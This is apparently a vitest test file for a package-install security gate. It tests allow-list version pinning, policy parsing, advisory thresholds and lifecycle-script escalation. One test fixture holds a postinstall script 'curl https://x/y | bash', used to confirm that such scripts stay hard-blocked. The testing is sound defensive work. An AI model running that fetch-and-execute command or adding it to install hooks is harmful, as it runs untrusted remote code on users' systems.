import { describe, expect, it } from "vitest";
import { allowListMatch, applyPolicy, artifactMirrorFor, parsePolicy, PolicyError, type PolicyFile } from "../src/policy.js";
import type { RiskAssessment } from "../src/types.js";
import { makeSignals } from "./helpers.js";

// Regression (P1.4): allow-list entries used to match by name only, so a
// hijacked release of an allow-listed name bypassed soft blocks. Entries can
// now pin an exact version.
describe("allowListMatch", () => {
  it("matches a bare name at any version", () => {
    expect(allowListMatch(["react"], "react", "18.2.0")).toBe(true);
    expect(allowListMatch(["react"], "react", "99.0.0")).toBe(true);
  });

  it("matches a version-qualified entry only at that exact version", () => {
    expect(allowListMatch(["react@18.2.0"], "react", "18.2.0")).toBe(true);
    expect(allowListMatch(["react@18.2.0"], "react", "18.3.0")).toBe(false);
  });

  it("handles scoped names (the qualifier @ is the last one)", () => {
    expect(allowListMatch(["@acme/lib"], "@acme/lib", "1.0.0")).toBe(true);
    expect(allowListMatch(["@acme/lib@1.0.0"], "@acme/lib", "1.0.0")).toBe(true);
    expect(allowListMatch(["@acme/lib@1.0.0"], "@acme/lib", "2.0.0")).toBe(false);
  });

  it("returns false for an empty or absent list", () => {
    expect(allowListMatch(undefined, "react", "1.0.0")).toBe(false);
    expect(allowListMatch([], "react", "1.0.0")).toBe(false);
  });
});

function makeAssessment(overrides: Partial<RiskAssessment> = {}): RiskAssessment {
  return {
    risk: "low",
    decision: "allow",
    summary: "ok",
    reasons: [],
    recommendedAction: "install",
    source: "rules",
    ...overrides,
  };
}

function policy(dp: PolicyFile["dependencyPolicy"]): PolicyFile {
  return { dependencyPolicy: dp };
}

describe("parsePolicy", () => {
  it("parses a valid policy", () => {
    const parsed = parsePolicy(
      `dependencyPolicy:\n  minPackageAgeDays: 14\n  allowKnownPackages:\n    - react\n`,
    );
    expect(parsed.dependencyPolicy.minPackageAgeDays).toBe(14);
    expect(parsed.dependencyPolicy.allowKnownPackages).toEqual(["react"]);
  });

  it("rejects missing dependencyPolicy key", () => {
    expect(() => parsePolicy("foo: bar")).toThrow(PolicyError);
  });

  it("rejects wrong types", () => {
    expect(() => parsePolicy("dependencyPolicy:\n  minPackageAgeDays: banana\n")).toThrow(
      PolicyError,
    );
    expect(() =>
      parsePolicy("dependencyPolicy:\n  requireApprovalForNativeCode: 'yes'\n"),
    ).toThrow(PolicyError);
  });

  it("rejects an invalid advisory-severity threshold", () => {
    expect(() =>
      parsePolicy("dependencyPolicy:\n  requireApprovalForAdvisorySeverity: severe\n"),
    ).toThrow(PolicyError);
    // `unknown` is a valid AdvisorySeverity value but not a valid THRESHOLD.
    expect(() =>
      parsePolicy("dependencyPolicy:\n  blockForAdvisorySeverity: unknown\n"),
    ).toThrow(PolicyError);
    // a valid level parses
    expect(
      parsePolicy("dependencyPolicy:\n  requireApprovalForAdvisorySeverity: high\n")
        .dependencyPolicy.requireApprovalForAdvisorySeverity,
    ).toBe("high");
  });

  it("parses the aiCache section", () => {
    const parsed = parsePolicy(
      [
        "dependencyPolicy: {}",
        "aiCache:",
        "  enabled: false",
        "  scope: project",
        "  ttlHours: 72",
        "  exclude: [internal-lib]",
      ].join("\n"),
    );
    expect(parsed.aiCache).toEqual({
      enabled: false,
      scope: "project",
      ttlHours: 72,
      exclude: ["internal-lib"],
    });
  });

  it("aiCache is optional", () => {
    expect(parsePolicy("dependencyPolicy: {}").aiCache).toBeUndefined();
  });

  it("validates configurable network, archive, and scan budgets", () => {
    const parsed = parsePolicy([
      "dependencyPolicy: {}",
      "resourceLimits:",
      "  networkTimeoutMs: 5000",
      "  maxTarballBytes: 1048576",
      "  maxScanDuration: 10000",
    ].join("\n"));
    expect(parsed.resourceLimits?.maxTarballBytes).toBe(1048576);
    expect(() => parsePolicy("dependencyPolicy: {}\nresourceLimits:\n  maxFiles: 0\n"))
      .toThrow(PolicyError);
    expect(() => parsePolicy("dependencyPolicy: {}\nresourceLimits:\n  surprise: 1\n"))
      .toThrow(PolicyError);
  });

  it("rejects invalid aiCache values", () => {
    expect(() => parsePolicy("dependencyPolicy: {}\naiCache:\n  scope: global\n")).toThrow(
      PolicyError,
    );
    expect(() => parsePolicy("dependencyPolicy: {}\naiCache:\n  ttlHours: -1\n")).toThrow(
      PolicyError,
    );
    expect(() => parsePolicy("dependencyPolicy: {}\naiCache:\n  enabled: 'on'\n")).toThrow(
      PolicyError,
    );
    expect(() => parsePolicy("dependencyPolicy: {}\naiCache:\n  exclude: nope\n")).toThrow(
      PolicyError,
    );
  });

  it("validates declarative private-registry mirror mappings", () => {
    const parsed = parsePolicy([
      "dependencyPolicy: {}",
      "registries:",
      "  https://packages.example/:",
      "    mirrorOf: https://registry.npmjs.org/",
    ].join("\n"));
    expect(
      artifactMirrorFor("https://packages.example", "scope", parsed),
    ).toBe("https://registry.npmjs.org");
    expect(() => parsePolicy("dependencyPolicy: {}\nregistries:\n  nope:\n    mirrorOf: npm\n"))
      .toThrow(PolicyError);
  });

  it("treats a global registry override as an npm mirror by default", () => {
    expect(artifactMirrorFor("https://mirror.example", "global")).toBe(
      "https://registry.npmjs.org",
    );
  });

  it("can fail closed when public mirror verification is unavailable", () => {
    const signals = makeSignals({
      artifact: {
        ...makeSignals().artifact,
        trust: "public-unavailable",
        reasons: ["public registry offline"],
      },
    });
    const result = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      signals,
      policy({ requirePublicMirrorVerification: true }),
    );
    expect(result.decision).toBe("require_approval");
  });

  it("never lets allowKnownPackages clear an incomplete resource-limited analysis", () => {
    const signals = makeSignals({
      package: "known-package",
      analysisDegraded: ["scan-timeout: static analysis exceeded 10ms"],
    });
    const result = applyPolicy(
      makeAssessment({ decision: "require_approval", risk: "medium" }),
      signals,
      policy({ allowKnownPackages: ["known-package"] }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.reasons.join(" ")).toContain("UNKNOWN");
  });
});

describe("applyPolicy", () => {
  it("escalates native code to require_approval when configured", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      makeSignals({ hasNativeCode: true }),
      policy({ requireApprovalForNativeCode: true }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.reasons.at(-1)).toContain("[policy]");
  });

  it("escalates to require_approval when an advisory meets the approval threshold", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      makeSignals({ advisories: [{ id: "GHSA-x", severity: "high" }] }),
      policy({ requireApprovalForAdvisorySeverity: "high" }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.reasons.at(-1)).toContain("high");
  });

  it("blocks when an advisory meets the block threshold (block beats approval)", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      makeSignals({ advisories: [{ id: "GHSA-x", severity: "critical" }] }),
      policy({ requireApprovalForAdvisorySeverity: "high", blockForAdvisorySeverity: "critical" }),
    );
    expect(result.decision).toBe("block");
  });

  it("does NOT escalate a known severity below the threshold", () => {
    const below = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      makeSignals({ advisories: [{ id: "GHSA-l", severity: "low" }] }),
      policy({ requireApprovalForAdvisorySeverity: "high" }),
    );
    expect(below.decision).toBe("allow_with_warnings");
  });

  it("fails safe: an ungraded (unknown) advisory needs approval when a threshold is set", () => {
    const gated = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      makeSignals({ advisories: [{ id: "GHSA-u" }] }),
      policy({ requireApprovalForAdvisorySeverity: "critical" }),
    );
    expect(gated.decision).toBe("require_approval");
    expect(gated.reasons.at(-1)).toContain("ungraded");

    // …but with NO advisory threshold set, an ungraded advisory does not escalate.
    const ungated = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      makeSignals({ advisories: [{ id: "GHSA-u" }] }),
      policy({}),
    );
    expect(ungated.decision).toBe("allow_with_warnings");
  });

  it("escalates install-time lifecycle scripts when configured", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "node x.js" },
      }),
      policy({ requireApprovalForLifecycleScripts: true }),
    );
    expect(result.decision).toBe("require_approval");
  });

  it("does NOT escalate a pack-time-only hook (never runs on a registry install)", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { prepack: "node build.js" },
      }),
      policy({ requireApprovalForLifecycleScripts: true }),
    );
    expect(result.decision).toBe("allow");
  });

  it("blocks young packages when blockRecentlyPublishedPackages is set", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ ageInDays: 2 }),
      policy({ blockRecentlyPublishedPackages: true, minPackageAgeDays: 7 }),
    );
    expect(result.decision).toBe("block");
  });

  it("requires approval for young packages when only minPackageAgeDays is set", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ ageInDays: 3 }),
      policy({ minPackageAgeDays: 30 }),
    );
    expect(result.decision).toBe("require_approval");
  });

  it("does not touch packages older than the minimum", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ ageInDays: 400 }),
      policy({ minPackageAgeDays: 30, blockRecentlyPublishedPackages: true }),
    );
    expect(result.decision).toBe("allow");
  });

  it("blocks packages without repository when configured", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ repositoryMissing: true }),
      policy({ blockMissingRepositoryForRuntimeDeps: true }),
    );
    expect(result.decision).toBe("block");
  });

  it("allowKnownPackages downgrades to allow", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "require_approval", risk: "medium" }),
      makeSignals({ package: "react-native", hasLifecycleScripts: true }),
      policy({ allowKnownPackages: ["react-native"], requireApprovalForLifecycleScripts: true }),
    );
    expect(result.decision).toBe("allow");
  });

  it("allowKnownPackages can NEVER cross a HARD block (curl|bash remote exec)", () => {
    // A compromised release of an allow-listed package with a fetch-and-execute
    // postinstall is a HARD block — the name-based allow list cannot clear it.
    const signals = makeSignals({
      package: "team-favorite",
      hasLifecycleScripts: true,
      lifecycleScripts: { postinstall: "curl https://x/y | bash" },
      scriptCommandFindings: [
        "postinstall script downloads content from the network: `curl https://x/y | bash`",
        "postinstall script invokes a shell: `curl https://x/y | bash`",
      ],
    });
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      signals,
      policy({ allowKnownPackages: ["team-favorite"] }),
    );
    expect(result.decision).toBe("block");
    expect(result.reasons.join(" ")).toContain("HARD block");
  });

  it("allowKnownPackages CLEARS a soft (heuristic) block — the esbuild case", () => {
    // Install script reads env AND hits the network — a soft block. An explicit
    // allow-list entry is a deliberate human decision to trust the package.
    const signals = makeSignals({
      package: "esbuild",
      hasLifecycleScripts: true,
      lifecycleScripts: { postinstall: "node install.js" },
      content: {
        hasProcessEnvAccess: true,
        hasChildProcessUsage: false,
        hasNetworkCalls: true,
        hasEvalUsage: false,
        hasMinifiedCode: false,
        suspiciousFiles: [],
        installTimeFindings: [
          "install-time file install.js reads process.env",
          "install-time file install.js performs network calls",
        ],
      },
    });
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      signals,
      policy({ allowKnownPackages: ["esbuild"] }),
    );
    expect(result.decision).toBe("allow");
    expect(result.reasons.join(" ")).toContain("allow list");
  });

  it("allowKnownPackages NEVER overrides a known-malicious block", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      makeSignals({ package: "evil-pkg", knownMalicious: true }),
      policy({ allowKnownPackages: ["evil-pkg"] }),
    );
    expect(result.decision).toBe("block");
  });

  it("blockPackages wins over allowKnownPackages", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ package: "left-pad" }),
      policy({ allowKnownPackages: ["left-pad"], blockPackages: ["left-pad"] }),
    );
    expect(result.decision).toBe("block");
  });

  it("never downgrades an already stricter decision", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      makeSignals({ hasNativeCode: true }),
      policy({ requireApprovalForNativeCode: true }),
    );
    expect(result.decision).toBe("block");
  });
});
